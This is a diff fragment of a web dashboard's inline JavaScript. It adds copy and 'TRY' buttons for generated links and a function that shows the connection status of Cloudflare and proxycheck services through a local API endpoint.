+                        textArea.select();
+                        document.execCommand("copy");
+                        // document.execCommand("copy");
+                        document.body.removeChild(textArea);
+                    }
+                    const original = btn.textContent;
+                    btn.textContent = 'COPIED!';
+                    btn.style.backgroundColor = 'var(--c-info)';
+                    btn.style.color = '#000';
+                    setTimeout(() => {
+                        btn.textContent = original;
+                        btn.style.backgroundColor = '';
+                        btn.style.color = '#fff';
+                    }, 1000);
+                };
+
+                const tryBtn = document.createElement('button');
+                tryBtn.textContent = 'TRY';
+                tryBtn.className = 'secondary';
+                tryBtn.style.padding = '8px 16px';
+                tryBtn.style.fontSize = '12px';
+                tryBtn.style.borderColor = 'var(--accent)';
+                tryBtn.style.color = 'var(--accent)';
+                tryBtn.style.fontWeight = 'bold';
+                tryBtn.onclick = () => window.open(url, '_blank');
+
+                group.appendChild(btn);
+                group.appendChild(tryBtn);
+                list.appendChild(group);
+            }
+        }
+    } catch (e) {
+    }
+}
+
+async function updateConnectionStatus() {
+    try {
+        const response = await fetch('/api.php?action=get_connection_status');
+        const data = await response.json();
+
+        if (data.ok) {
+            const cloudflareDot = document.getElementById('cloudflareStatusDot');
+            const proxycheckDot = document.getElementById('proxycheckStatusDot');
+
+            if (data.cloudflare.connected) {
+                cloudflareDot.classList.add('active');
+            } else {
+                cloudflareDot.classList.remove('active');
+            }
+
+            if (data.proxycheck.connected) {
+                proxycheckDot.classList.add('active');
+            } else {
+                proxycheckDot.classList.remove('active');
+            }
+        } else {
+            console.error('Failed to get connection status:', data.error);
+        }
+    } catch (error) {
+        console.error('Error fetching connection status:', error);
+    }
+}
+
+loadDeploymentInfo();
+updateConnectionStatus(); // Call on initial load
+
+</script>
+</body>
+</html>
